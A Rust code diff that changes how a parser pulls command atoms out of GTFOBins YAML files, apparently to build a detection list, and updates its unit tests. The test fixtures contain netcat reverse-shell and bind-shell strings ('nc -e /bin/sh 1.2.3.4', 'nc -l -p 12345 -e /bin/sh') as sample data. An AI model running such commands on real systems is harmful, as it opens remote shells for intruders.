@@ -403,24 +403,27 @@ mod imp {
     /// We extract every `code` scalar, take its first line, trim.
     /// Atom rules (≥3 chars, no leading `#`) apply at write time.
     fn extract_gtfobins_atoms(content: &str, atoms: &mut BTreeSet<String>) {
-        // Front-matter must be `---\n…---\n` Jekyll-style. Tighter
-        // parsing than "split on the first `---`" — without the
-        // close fence (or with garbage trailing the YAML) the whole
-        // markdown body would be handed to serde_yaml. Bail clean
-        // on missing fence: the upstream file is malformed and we
-        // shouldn't pretend to parse atoms from prose.
+        // Front-matter starts with `---\n`. Upstream GTFOBins files
+        // (verified 2026-05-19 on GTFOBins/GTFOBins.github.io@master)
+        // are PURE YAML wrapped in a leading `---\n` — there's no
+        // closing fence, and the rest of the file is the structured
+        // YAML body Jekyll renders. The earlier "require closing
+        // fence" check produced 0 atoms across the entire corpus
+        // because the close marker never existed. Now: strip the
+        // leading fence, treat the rest as YAML. If a closing
+        // `\n---\n` IS present (e.g. a future file with trailing
+        // prose), truncate at it.
         let stripped = content
             .strip_prefix("---\n")
             .or_else(|| content.strip_prefix("---\r\n"));
         let Some(rest) = stripped else { return };
-        let close_marker = if let Some(at) = rest.find("\n---\n") {
-            (at, 5)
+        let yaml = if let Some(at) = rest.find("\n---\n") {
+            &rest[..at]
         } else if let Some(at) = rest.find("\n---\r\n") {
-            (at, 6)
+            &rest[..at]
         } else {
-            return;
+            rest
         };
-        let yaml = &rest[..close_marker.0];
         let parsed: serde_yaml::Value = match serde_yaml::from_str(yaml) {
             Ok(v) => v,
             Err(_) => return,
@@ -816,16 +819,37 @@ Commands:
         }
 
         #[test]
-        fn extract_gtfobins_bails_without_close_fence() {
-            // Without a closing `---` fence, treat the file as
-            // malformed and emit zero atoms — DON'T pass the
-            // whole markdown body to serde_yaml.
-            let doc = "---\nfunctions:\n  shell:\n    - code: |\n        nc -e /bin/sh 1.2.3.4\nNo closing fence here, just markdown text after the front-matter.\n";
+        fn extract_gtfobins_handles_missing_close_fence() {
+            // Upstream GTFOBins files have ONLY a leading `---\n`
+            // fence — no closing one. The whole file is YAML. The
+            // earlier "require closing fence" check produced 0
+            // atoms across the entire corpus (the bug this commit
+            // also fixes). Now: leading fence stripped, rest parsed
+            // as YAML, atoms emitted.
+            let doc = "---\nfunctions:\n  shell:\n  - code: |-\n      nc -e /bin/sh 1.2.3.4\n  bind-shell:\n  - code: nc -l -p 12345 -e /bin/sh\n";
             let mut atoms = BTreeSet::new();
             extract_gtfobins_atoms(doc, &mut atoms);
             assert!(
-                atoms.is_empty(),
-                "expected no atoms from malformed file, got {atoms:?}"
+                !atoms.is_empty(),
+                "expected atoms from a no-close-fence file, got none"
+            );
+            assert!(
+                atoms.iter().any(|a| a.contains("nc")),
+                "expected an nc-related atom, got {atoms:?}"
+            );
+        }
+
+        #[test]
+        fn extract_gtfobins_handles_close_fence_when_present() {
+            // Future-proof: if a GTFOBins file ever grows trailing
+            // prose after a closing `---` fence, truncate at the
+            // fence rather than handing the prose to serde_yaml.
+            let doc = "---\nfunctions:\n  shell:\n  - code: |-\n      nc -e /bin/sh 1.2.3.4\n---\nPost-fence prose that isn't YAML.\n";
+            let mut atoms = BTreeSet::new();
+            extract_gtfobins_atoms(doc, &mut atoms);
+            assert!(
+                !atoms.is_empty(),
+                "expected atoms when prose follows close fence"
             );
         }
 
